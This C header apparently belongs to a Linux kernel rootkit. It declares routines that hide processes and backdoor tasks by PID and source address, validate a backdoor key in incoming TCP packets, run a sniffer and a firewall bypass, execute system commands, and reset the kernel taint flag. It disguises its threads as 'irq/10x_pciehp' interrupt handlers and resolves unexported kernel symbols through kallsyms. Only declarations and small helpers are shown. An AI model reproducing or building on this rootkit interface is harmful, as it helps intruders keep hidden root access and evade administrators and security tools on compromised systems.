#ifndef __KERNEL_ADDR_H
#define __KERNEL_ADDR_H

#define EXIT_UNHIDE 1
#define OBFLEN(x) (sizeof(x) / sizeof(char *))
#define OBFLEN2(x) sizeof(x)

#define THREAD_PROC_NAME "irq/100_pciehp"
#define THREAD_SOCK_NAME "irq/101_pciehp"
#define THREAD_SNIFFER_NAME "irq/102_pciehp"
#define THREAD_TAINTED_NAME "irq/103_pciehp"

typedef enum { CHILDREN, NO_CHILDREN, WHATEVER } Operation;

struct hidden_tasks {
	struct task_struct *task;
	struct fs_file_node *fnode;
	int select;
	struct list_head list;
	pid_t group;
	__be32 saddr;
};

struct hidden_status {
	__be32 saddr;
	bool hidden;
};

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0)
typedef void (*attach_pid_sg)(struct task_struct *, enum pid_type,
			      struct pid *);
#else
typedef void (*attach_pid_sg)(struct task_struct *, enum pid_type);
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
typedef struct bpf_map *(*bpf_map_get_sg)(unsigned int);
#else
typedef struct bpf_map *(*bpf_map_get_sg)(struct fd);
#endif

typedef unsigned long (*kallsyms_lookup_name_sg)(const char *name);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
typedef void (*do_exit_sg)(long error_code) __noreturn;
#endif

typedef asmlinkage long (*sys64)(struct pt_regs *regs);

typedef void (*do__set_task_comm_sg)(struct task_struct *, const char *, bool);

struct kernel_syscalls {
	attach_pid_sg k_attach_pid;
	bpf_map_get_sg k_bpf_map_get;
	kallsyms_lookup_name_sg k_kallsyms_lookup_name;
	sys64 k_sys_setreuid;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
	do_exit_sg k_do_exit;
#endif
	do__set_task_comm_sg k__set_task_comm;
	unsigned long *tainted;
};

typedef void (*decrypt_callback)(const u8 *const buf, size_t buflen,
				 size_t copied, void *userdata);

int av_crypto_engine_init(void);
struct av_crypto_st *av_crypto_mgc_init(void);
size_t av_encrypt(struct av_crypto_st *, u8 *, size_t);
size_t av_decrypt(struct av_crypto_st *, decrypt_callback, void *userdata);
void av_crypto_free_data(struct av_crypto_st *);
void av_crypto_mgc_deinit(struct av_crypto_st *);
void av_crypto_engine_deinit(void);
bool sys_init(void);
void sys_deinit(void);
char *sys_get_ttyfile(void);
char *sys_get_sslfile(void);
bool av_pid_init(struct kernel_syscalls *fn_addr);
bool av_find_hidden_pid(struct hidden_status *status, pid_t pid);
bool av_find_hidden_task(struct task_struct *);
void av_hide_task_by_pid(pid_t, __be32, Operation);
void av_unhide_task_by_pid_exit_group(pid_t pid);
bool av_for_each_hidden_backdoor_task(bool (*cb)(struct task_struct *, void *),
				      void *);
bool av_for_each_hidden_backdoor_data(bool (*cb)(__be32, void *), void *);
void av_reload_hidden_task(struct task_struct *task);
void av_pid_cleanup(void);
void av_rename_task(pid_t, const char *);
void av_show_saved_tasks(void);
void av_show_all_tasks(void);
void av_scan_and_hide(void);
struct kernel_syscalls *av_kall_load_addr(void);
void av_reset_tainted(unsigned long *);
struct task_struct *av_sock_start_sniff(void);
bool av_sock_start_fw_bypass(void);
void av_sock_stop_sniff(struct task_struct *tsk);
void av_sock_stop_fw_bypass(void);
#ifdef DEBUG_RING_BUFFER
struct av_crypto_st *av_sock_get_mgc(void);
#endif
bool av_bd_search_iph_source(__be32 saddr);
bool av_check_bdkey(struct tcphdr *, struct sk_buff *);
void av_bd_cleanup_item(__be32 *);
int av_add_proc_interface(void);
void av_remove_proc_interface(void);
int av_is_proc_interface_loaded(void);
char *av_util_random_AZ_string(size_t);
int av_run_system_command(char **);
unsigned long av_get_elf_vm_start(pid_t);

enum {
	AV_TASK,
	AV_TASK_BD
};

struct _av_hide_ps_on_load {
	const char *name;
	int type;
};

static struct _av_hide_ps_on_load av_hide_ps_on_load[] = {
	{ NULL, -1 },
};

static inline const char **av_get_hide_ps_names(void)
{
	static const char *names[32];
	if (!*names) {
		int i = 0;
		size_t maxnames = sizeof(names) / sizeof(*names);
		for (; i < maxnames && av_hide_ps_on_load[i].name != NULL;
		     ++i) {
			names[i] = av_hide_ps_on_load[i].name;
		}
	}
	return names;
}

#define PP_NARG(...) PP_NARG_(__VA_ARGS__, PP_RSEQ_N())
#define PP_NARG_(...) PP_ARG_N(__VA_ARGS__)
#define PP_ARG_N(_1, _2, _3, _4, _5, _6, _7, _8, _9, _10, _11, _12, _13, _14,  \
		 _15, _16, _17, _18, _19, _20, _21, _22, _23, _24, _25, _26,   \
		 _27, _28, _29, _30, _31, _32, _33, _34, _35, _36, _37, _38,   \
		 _39, _40, _41, _42, _43, _44, _45, _46, _47, _48, _49, _50,   \
		 _51, _52, _53, _54, _55, _56, _57, _58, _59, _60, _61, _62,   \
		 _63, N, ...)                                                  \
	N
#define PP_RSEQ_N()                                                            \
	63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47,    \
		46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32,    \
		31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17,    \
		16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0

static inline void _kfree(void **p)
{
	if (*p != NULL) {
		kfree(*p);
		*p = NULL;
	}
}

static void __attribute__((unused)) mem_free(int argc, ...)
{
	va_list ap;
	int i;
	va_start(ap, argc);
	for (i = 0; i < argc; ++i)
		_kfree(va_arg(ap, void **));
	va_end(ap);
}
#define av_mem_free(...) mem_free(PP_NARG(__VA_ARGS__), __VA_ARGS__)

struct kernel_addr_meta {
	int dummy_value;
	unsigned long random_value;
};

static inline int check_kernel_addr_meta(struct kernel_addr_meta *kam)
{
	if (kam) {
		kam->dummy_value ^= 0xA5A5;
		kam->random_value += 0x1234;
		return 1;
	}
	return 0;
}

#endif
